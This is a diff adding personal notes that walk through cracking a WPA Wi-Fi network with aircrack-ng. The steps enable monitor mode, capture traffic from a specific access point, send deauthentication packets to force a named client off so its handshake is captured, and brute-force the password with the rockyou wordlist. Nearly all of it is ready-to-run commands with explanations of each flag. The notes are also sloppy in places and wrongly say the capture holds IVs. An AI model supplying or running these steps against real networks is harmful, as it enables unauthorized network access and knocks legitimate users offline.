@@ -1,0 +1,35 @@
+Step 1> Start Monitor mode
+	airmon-ng start wlan0  //airmon-ng stop wlan0mon
+
+Step 2> Scan Network ==> Basic information
+	airodump-ng wlan0mon
+
+Step 3> Capture packet
+	airodump-ng --bssid A0:65:18:1C:5A:C7 -c 11 -w WPAcrack wlan0mon
+
+		--bssid : as MAC add of AP
+    		-c 11: Channel
+    		-w WPAcrack: export WPAcrack.cap file ==> contain IVs
+    		wlan0mon: Network card in monitor mode
+
+==> Wait for 5m
+
++Step 4> 
+	aireplay-ng -0 2 -a A0:65:18:1C:5A:C7 -c DA:3F:65:23:0A:EE wlan0mon
+
+		-0 : short-cut for death mode
+		-2 : number of deauth packet which need to be send
+		-a : AP BSSID
+		-c : Client
+
++Step 5> Bru-f with wordlist
+	aircrack-ng -a2 -b A0:65:18:1C:5A:C7 -w /home/kali/Documents/rockyou.txt WPAcrack-01.cap
+		
+
+		WPA-LIST ==> wordlist
+		-a : technique to crack the handshark
+		2 = WPA technique
+		-w : stand wordlist
+
+==> WAIT BRU-F
+	
